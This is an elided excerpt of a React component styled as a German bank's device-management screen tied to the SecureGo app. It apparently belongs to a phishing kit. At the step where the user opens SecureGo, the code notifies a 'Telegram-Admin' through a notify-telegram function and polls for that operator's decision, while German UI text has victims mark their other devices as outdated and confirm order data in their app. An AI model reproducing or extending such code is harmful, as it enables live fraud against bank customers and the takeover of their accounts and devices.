// @ts-nocheck
import { Info, ArrowRight, Check, ShieldCheck, ChevronDown, Smartphone, CheckCircle2 } from "lucide-react";
...
const DeviceManagement = ({ devices, bankId, onContinue }: DeviceManagementProps) => {
  ...
  const selectedDevices = useMemo(
    () => list.filter((_, i) => selected.has(i)),
    [list, selected],
  );
  const unselectedDevices = useMemo(
    () => list.filter((_, i) => !selected.has(i)),
    [list, selected],
  );
  ...
  const openSecureGo = () => {
    ...
    // Telegram-Admin um Freigabe der Geräteverwaltung bitten
    try {
      ...
      if (tgSessionId) {
        (supabase as any).functions
          ...
          .catch((err: unknown) =>
            console.error("notify-telegram device-management-pending failed", err),
          );
      }
    } catch (err) {
  ...
  // Poll Telegram decision while SecureGo is open
  useEffect(() => {
        ...
        {!isSingle && (
          <div className="mt-5 flex items-start gap-3 rounded-lg border border-[#cfe1f1] bg-[#eaf3fb] p-3">
            ...
            <p className="text-[14px] text-[#0a1f44]">
              Sie können mehrere Geräte auswählen. <strong>Mindestens ein Gerät</strong> muss
              ausgewählt werden.
            </p>
          </div>
        )}
            ...
            <div className="rounded-lg border border-gray-200 p-4 space-y-3">
              ...
              <div>
                <p className="text-sm font-bold text-gray-900 mb-1">
                  Diese Geräte werden als nicht mehr aktuell markiert
                </p>
            ...
            <div className="space-y-4 mt-5">
              ...
              {showExplanation && (
                <div className="rounded-lg bg-blue-50 border border-blue-200 p-3 text-sm text-gray-700">
                  Gleichen Sie die Auftragsdaten in der App mit den hier angezeigten Daten ab, bevor Sie
